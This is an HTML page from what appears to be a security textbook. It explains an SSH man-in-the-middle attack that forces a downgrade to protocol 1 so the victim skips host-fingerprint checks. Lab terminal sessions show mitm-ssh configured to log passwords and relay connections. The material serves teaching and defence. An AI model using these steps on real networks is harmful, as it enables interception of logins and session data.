<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x752 Differing SSH Protocol Host Fingerprints</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part179.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part181.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark165">0x752 Differing SSH Protocol Host Fingerprints</a></p><p style="padding-top: 5pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">SSH host fingerprints do have a few vulnerabilities. These vulnerabilities have been compensated for in the most recent versions of openssh, but they still exist in older implementations.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 106%;text-align: left;">Usually, the first time an SSH connection is made to a new host, that host’s fingerprint is added to a <span class="s31">known_hosts </span>file, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1233.png"/></span></p><p style="padding-left: 19pt;text-indent: 0pt;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh jose@192.168.42.72</a></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Are you sure you want to continue connecting (yes/no)? yes</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Warning: Permanently added &#39;192.168.42.72&#39; (RSA) to the list of known hosts. jose@192.168.42.72&#39;s password: &lt;ctrl-c&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">iz@tetsuo:~ $ grep 192.168.42.72 ~/.ssh/known_hosts 192.168.42.72 ssh-rsa</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 8pt;text-align: left;">AAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">JSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/ 52KTzjtKGacX4gTLNSc8fzfZU=</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">iz@tetsuo:~ $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1234.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">However, there are two different protocols of SSH—SSH1 and SSH2— each with separate host fingerprints.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1235.png"/></span></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ rm ~/.ssh/known_hosts iz@tetsuo:~ $ ssh -1 jose@192.168.42.72</a></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA1 key fingerprint is e7:c4:81:fe:38:bc:a8:03:f9:79:cd:16:e9:8f:43:55.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Are you sure you want to continue connecting (yes/no)? no Host key verification failed.</p><p style="padding-left: 19pt;text-indent: 0pt;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh -2 jose@192.168.42.72</a></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Are you sure you want to continue connecting (yes/no)? no Host key verification failed.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">iz@tetsuo:~ $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1236.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The banner presented by the SSH server describes which SSH protocols it understands (shown in bold below):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1237.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">iz@tetsuo:~ $ telnet 192.168.42.72 22</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Trying 192.168.42.72...</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Connected to 192.168.42.72. Escape character is &#39;^]&#39;. <b>SSH-1.99-OpenSSH_3.9p1</b></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">Connection closed by foreign host. iz@tetsuo:~ $ telnet 192.168.42.1 22</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Trying 192.168.42.1...</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Connected to 192.168.42.1. Escape character is &#39;^]&#39;.</p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Connection closed by foreign host. iz@tetsuo:~ $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1238.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The banner from 192.168.42.72 (loki) includes the string <span class="s31">SSH-1.99</span>, which, by convention, means that the server speaks both protocols 1 and 2. Often, the SSH server will be configured with a line like <span class="s31">Protocol 2,1</span>, which also means the server speaks both protocols and tries to use SSH2 if possible. This is to retain backward compatibility, so SSH1-only clients can still connect.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In contrast, the banner from 192.168.42.1 includes the string <span class="s31">SSH-2.0</span>, which shows that the server only speaks protocol 2. In this case, it’s obvious that any clients connecting to it have only communicated with SSH2 and therefore only have host fingerprints for protocol 2.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The same is true for loki (192.168.42.72); however, loki also accepts SSH1, which has a different set of host fingerprints. It’s unlikely that a client will have used SSH1, and therefore doesn’t have the host fingerprints for this protocol yet.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">If the modified SSH daemon being used for the MitM attack forces the client to communicate using the other protocol, no host fingerprint will be found. Instead of being presented with a lengthy warning, the user will simply</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">be asked to add the new fingerprint. The mitm-sshtool uses a configuration file similar to openssh’s, since it’s built from that code. By adding the line <span class="s31">Protocol 1 </span>to /usr/local/etc/mitm-ssh_config, the mitm-ssh daemon will claim it only speaks the SSH1 protocol.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The output below shows that loki’s SSH server usually speaks using both SSH1 and SSH2 protocols, but when mitm-ssh is put in the middle using the new configuration file, the fake server claims it only speaks SSH1 protocol.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">From 192.168.42.250 (tetsuo), Just an Innocent Machine on the Network</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1239.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">iz@tetsuo:~ $ telnet 192.168.42.72 22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Trying 192.168.42.72...</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">Connected to 192.168.42.72. Escape character is &#39;^]&#39;. <b>SSH-1.99-OpenSSH_3.9p1</b></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">Connection closed by foreign host. iz@tetsuo:~ $ rm ~/.ssh/known_hosts iz@tetsuo:~ $ ssh jose@192.168.42.72</a></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Are you sure you want to continue connecting (yes/no)? yes</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Warning: Permanently added &#39;192.168.42.72&#39; (RSA) to the list of known hosts. jose@192.168.42.72&#39;s password:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">iz@tetsuo:~ $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1240.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-top: 5pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">On the Attacker’s Machine, Setting Up mitm-ssh to Only Use SSH1 Protocol</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1241.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ echo &quot;Protocol 1&quot; &gt;&gt; /usr/local/etc/mitm-ssh_config reader@hacking:~ $ tail /usr/local/etc/mitm-ssh_config</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"># Where to store passwords</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">#PasswdLogFile /var/log/mitm-ssh/passwd.log</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;"># Where to store data sent from client to server #ClientToServerLogDir /var/log/mitm-ssh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;"># Where to store data sent from server to client #ServerToClientLogDir /var/log/mitm-ssh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Protocol 1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222 Using static route to 192.168.42.72:22</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">SSH MITM Server listening on 0.0.0.0 port 2222. Generating 768 bit RSA key.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">RSA key generation complete.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1242.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Now Back on 192.168.42.250 (tetsuo)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1243.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">iz@tetsuo:~ $ telnet 192.168.42.72 22</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Trying 192.168.42.72...</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Connected to 192.168.42.72.</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Escape character is &#39;^]&#39;.</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SSH-1.5-OpenSSH_3.9p1</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Connection closed by foreign host.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1244.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Usually, clients such as tetsuo connecting to loki at 192.168.42.72 would have only communicated using SSH2. Therefore, there would only be a host fingerprint for SSH protocol 2 stored on the client. When protocol 1 is forced by the MitM attack, the attacker’s fingerprint won’t be compared to the stored fingerprint, due to the differing protocols. Older implementations will simply ask to add this fingerprint since, technically, no host fingerprint exists for this protocol. This is shown in the output below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1245.png"/></span></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh jose@192.168.42.72</a></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established. RSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Are you sure you want to continue connecting (yes/no)?</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1246.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Since this vulnerability was made public, newer implementations of OpenSSH have a slightly more verbose warning:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1247.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;"><a href="mailto:jose@192.168.42.72" class="s81" target="_blank">iz@tetsuo:~ $ ssh </a>jose@192.168.42.72 WARNING: RSA key found for host 192.168.42.72 in /home/iz/.ssh/known_hosts:1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">RSA key fingerprint ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">The authenticity of host &#39;192.168.42.72 (192.168.42.72)&#39; can&#39;t be established but keys of different type are already known for this host.</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">RSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6. Are you sure you want to continue connecting (yes/no)?</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1248.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This modified warning isn’t as strong as the warning given when host fingerprints of the same protocol don’t match. Also, since not all clients will be up to date, this technique can still prove to be useful for an MitM attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part179.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part181.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
